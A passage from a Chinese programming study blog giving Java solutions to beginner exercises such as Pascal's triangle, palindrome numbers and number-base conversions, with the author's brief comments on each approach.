</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(s.length()==<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.length() == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> s;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> s.charAt(s.length()-<span class="number">1</span>) + reverse(s.substring(<span class="number">0</span>,s.length()-<span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="另一种思路"><a href="#另一种思路" class="headerlink" title="另一种思路"></a>另一种思路</h3><blockquote>
<p>参考别人的，非常契合题目</p>
<p>两层循环，一层控制输出几行，一层控制该行输出m个字符。</p>
<p>另外，通过字符++和字符—找到B后面的C或者B前面的A。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AtoZ2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//输入</span></span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> m = scan.nextInt();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;<span class="comment">//打印n行</span></span><br><span class="line">			<span class="keyword">char</span> a = (<span class="keyword">char</span>)(<span class="string">'A'</span>+i);<span class="comment">//左边第一个</span></span><br><span class="line">			<span class="keyword">char</span> b = <span class="string">'A'</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k&lt;m;k++) &#123;<span class="comment">//每次打印的个数</span></span><br><span class="line">				<span class="keyword">if</span>(a&gt;<span class="string">'A'</span>) &#123;<span class="comment">//打印左边的部分，一直打印到'A'左边的</span></span><br><span class="line">					System.out.print(a--);</span><br><span class="line">				&#125;<span class="keyword">else</span> &#123;<span class="comment">//打印右边的部分，通过for循环控制</span></span><br><span class="line">					<span class="comment">//System.out.print(b++);</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(b++);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="数列特征"><a href="#数列特征" class="headerlink" title="数列特征"></a>数列特征</h2><blockquote>
<ol>
<li>一次循环解决</li>
<li>使用ArrayList代替数组加快解决</li>
</ol>
</blockquote>
<p>第一种，也是我直接想到的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> winter_new_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array_feature</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> [] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			arr[i] = scan.nextInt();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> min = arr[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> max = arr[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i]&gt;max) &#123;</span><br><span class="line">				max = arr[i];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(arr[i]&lt;min) &#123;</span><br><span class="line">				min = arr[i];</span><br><span class="line">			&#125;</span><br><span class="line">			sum+=arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(max);</span><br><span class="line">		System.out.println(min);</span><br><span class="line">		System.out.println(sum);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><ol>
<li><p>先排序，第一个元素为最小值，最后一个元素为最大值</p>
<p>使用<code>Collections.sort(list)</code>进行排序</p>
</li>
<li><p>直接求最大值和最小值</p>
<p>最大值：<code>Collections.max(list)</code></p>
<p>最小值：<code>Collections.min(list)</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> winter_new_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array_feature2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		List&lt;Integer&gt; list  = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			list.add(scan.nextInt());</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		Collections.sort(list);//排序</span></span><br><span class="line"><span class="comment">//		System.out.println(list.get(list.size()-1));</span></span><br><span class="line"><span class="comment">//		System.out.println(list.get(0));</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//直接求</span></span><br><span class="line">		System.out.println(Collections.max(list));</span><br><span class="line">		System.out.println(Collections.min(list));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查找整数"><a href="#查找整数" class="headerlink" title="查找整数"></a>查找整数</h2><blockquote>
<ol>
<li>for循环查找</li>
<li>使用list的indexof直接查找</li>
</ol>
</blockquote>
<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindInteger</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> [] arr = <span class="keyword">new</span> <span class="keyword">int</span> [n];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			arr[i] = scan.nextInt();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> num = scan.nextInt();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(num == arr[i]) &#123;</span><br><span class="line">				System.out.println(i+<span class="number">1</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="indexof"><a href="#indexof" class="headerlink" title="indexof"></a>indexof</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindInteger</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			list.add(scan.nextInt());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> result = list.indexOf(scan.nextInt());</span><br><span class="line">		<span class="keyword">if</span>(result == -<span class="number">1</span>) &#123;</span><br><span class="line">			System.out.println(-<span class="number">1</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.println(list.indexOf(scan.nextInt())+<span class="number">1</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="杨辉三角形"><a href="#杨辉三角形" class="headerlink" title="杨辉三角形"></a>杨辉三角形</h2><h3 id="动态创建二维数组"><a href="#动态创建二维数组" class="headerlink" title="动态创建二维数组"></a>动态创建二维数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> [][] arr;</span><br><span class="line">arr = <span class="keyword">new</span> <span class="keyword">int</span>[n][];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">	arr[i] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Yang</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br><span class="line">		<span class="keyword">int</span> [][] arr;</span><br><span class="line">		arr = <span class="keyword">new</span> <span class="keyword">int</span>[n][];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			arr[i] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		arr[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		arr[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		arr[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++) &#123;</span><br><span class="line">			arr[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">			arr[i][i] = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i-<span class="number">1</span>;j++) &#123;</span><br><span class="line">				arr[i][j] = arr[i-<span class="number">1</span>][j-<span class="number">1</span>]+arr[i-<span class="number">1</span>][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">       </span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i;j++) &#123;</span><br><span class="line">				System.out.print(arr[i][j]+<span class="string">" "</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="特殊的数字"><a href="#特殊的数字" class="headerlink" title="特殊的数字"></a>特殊的数字</h2><blockquote>
<ol>
<li>找到三位数的分开表述</li>
<li>三层for循环</li>
</ol>
</blockquote>
<h3 id="三位数的分开表述"><a href="#三位数的分开表述" class="headerlink" title="三位数的分开表述"></a>三位数的分开表述</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a = i/<span class="number">100</span>;</span><br><span class="line">b = i/<span class="number">10</span>%<span class="number">10</span>;</span><br><span class="line">c = i%<span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpecialNum</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> a,b,c;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;i++) &#123;</span><br><span class="line">			a = i/<span class="number">100</span>;</span><br><span class="line">			b = i/<span class="number">10</span>%<span class="number">10</span>;</span><br><span class="line">			c = i%<span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span>(Math.pow(a, <span class="number">3</span>)+Math.pow(b, <span class="number">3</span>)+Math.pow(c, <span class="number">3</span>) == i) &#123;</span><br><span class="line">				System.out.println(i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpecialNum2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">1</span>;a&lt;<span class="number">10</span>;a++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;<span class="number">10</span>;b++) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;<span class="number">10</span>;c++) &#123;</span><br><span class="line">					<span class="keyword">if</span>(a*<span class="number">100</span>+b*<span class="number">10</span>+c == Math.pow(a,<span class="number">3</span>)+ Math.pow(b,<span class="number">3</span>)+ Math.pow(c,<span class="number">3</span>)) &#123;</span><br><span class="line">						System.out.println(a*<span class="number">100</span>+b*<span class="number">10</span>+c);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于这种与进制相关的，可以考虑循环来做，循环的条件是几进制，循环的层数是几位</p>
</blockquote>
<h2 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2><p>这道题，网上的exp大多是比较第一位、低四位和第二位、第三位是否相同，循环从1000到9999</p>
<p>其实就是所有的二进制，然后后面和前面是镜面相同，所以输出所有的二进制，然后字符串翻转即可。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Huiwen</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">100</span>;i++) &#123;<span class="comment">//前两位</span></span><br><span class="line">			System.out.println(i+reverse(i+<span class="string">""</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//翻转</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">reverse</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(s.length()==<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.length() == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> s;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> s.charAt(s.length()-<span class="number">1</span>) + reverse(s.substring(<span class="number">0</span>,s.length()-<span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="特殊回文数"><a href="#特殊回文数" class="headerlink" title="特殊回文数"></a>特殊回文数</h2><blockquote>
<p><del>牛逼哄哄的觉着</del>，首先是循环，分循环写得劲，然后五位和六位的判断【注意：都是if】也很简单，因为要顺序排，所以六位放字符串里面存着，末尾加回车，最后输出</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpecialHui</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br><span class="line">		String s=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">1</span>;a&lt;<span class="number">10</span>;a++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;<span class="number">10</span>;b++) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;<span class="number">10</span>;c++) &#123;</span><br><span class="line">					<span class="keyword">if</span>(<span class="number">2</span>*(a+b)+c == n) &#123;<span class="comment">//五位</span></span><br><span class="line">						System.out.println(<span class="string">""</span>+a+b+c+b+a);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="number">2</span>*(a+b+c) == n) &#123;<span class="comment">//六位</span></span><br><span class="line">						s = s+a+b+c+c+b+a+<span class="string">"\n"</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="十进制转十六进制"><a href="#十进制转十六进制" class="headerlink" title="十进制转十六进制"></a>十进制转十六进制</h2><p>使用java内置的api：</p>
<ol>
<li><code>String.format(&quot;%X&quot;, num)</code></li>
<li><code>Integer.toHexString(num)</code>【转大写用：<code>toUpperCase()</code>】</li>
</ol>
<p>注意：X大写则输出的十六进制都是大写，小写则小写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FormSixteen</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> num = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br><span class="line">		System.out.println(String.format(<span class="string">"%X"</span>, num));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" title="十六进制转十进制"></a>十六进制转十进制</h2><blockquote>
<p>进制转换java都有实现好的，直接用即可。</p>
</blockquote>
<p>【注意：最大二进制八位，要用long型】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FormSixteen</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String hex = <span class="keyword">new</span> Scanner(System.in).next();</span><br><span class="line">		System.out.println(Long.parseLong(hex,<span class="number">16</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="十六进制转八进制"><a href="#十六进制转八进制" class="headerlink" title="十六进制转八进制"></a>十六进制转八进制</h2><blockquote>
<p><del>有点被恶心到了，感觉和别人写的差球不多，，，但是自己的运行不通过，555</del></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FormSixteen2</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> in;</span><br><span class="line">	<span class="keyword">static</span> String middle;</span><br><span class="line">	<span class="keyword">static</span> String result1 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">static</span> String result2 = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">static</span> String last = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> lenght;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ;i&lt;n;i++) &#123;</span><br><span class="line">			last += twotoeight(hextotwo(scan.next()))+<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(last);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//二进制转八进制</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">twotoeight</span><span class="params">(String eight)</span> </span>&#123;</span><br><span class="line">		result1=<span class="string">""</span>;</span><br><span class="line">		lenght = eight.length();</span><br><span class="line">		<span class="keyword">if</span>(lenght%<span class="number">3</span>==<span class="number">1</span>) &#123;</span><br><span class="line">			eight = <span class="string">"00"</span>+eight;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(lenght%<span class="number">3</span>==<span class="number">2</span>) &#123;</span><br><span class="line">			eight = <span class="string">"0"</span>+eight;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(eight.startsWith(<span class="string">"000"</span>)) &#123;</span><br><span class="line">			eight = eight.substring(<span class="number">3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;eight.length();i=i+<span class="number">3</span>) &#123;</span><br><span class="line">			middle = eight.substring(i,i+<span class="number">3</span>);</span><br><span class="line">			result1 += (middle.charAt(<span class="number">0</span>)-<span class="string">'0'</span>)*<span class="number">4</span>+ (middle.charAt(<span class="number">1</span>)-<span class="string">'0'</span>)*<span class="number">2</span>+ (middle.charAt(<span class="number">2</span>)-<span class="string">'0'</span>)+<span class="string">""</span>;	</span><br><span class="line">		&#125;		</span><br><span class="line">		<span class="keyword">return</span> result1;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//十六进制转二进制</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">hextotwo</span><span class="params">(String hex)</span> </span>&#123;</span><br><span class="line">		result2=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;hex.length();i++) &#123;</span><br><span class="line">			result2+=two(hex.charAt(i));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result2;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">two</span><span class="params">(<span class="keyword">char</span> six)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">switch</span>(six) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'0'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0000"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0001"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0010"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0011"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0100"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0101"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0110"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'7'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"0111"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'8'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1000"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'9'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1001"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1010"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1011"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1100"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1101"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1110"</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="string">"1111"</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//	static String oc(String two) &#123;</span></span><br><span class="line"><span class="comment">//		switch(two) &#123;</span></span><br><span class="line"><span class="comment">//			case "000":</span></span><br><span class="line"><span class="comment">//				return "0";</span></span><br><span class="line"><span class="comment">//			case "001":</span></span><br><span class="line"><span class="comment">//				return "1";</span></span><br><span class="line"><span class="comment">//			case "010":</span></span><br><span class="line"><span class="comment">//				return 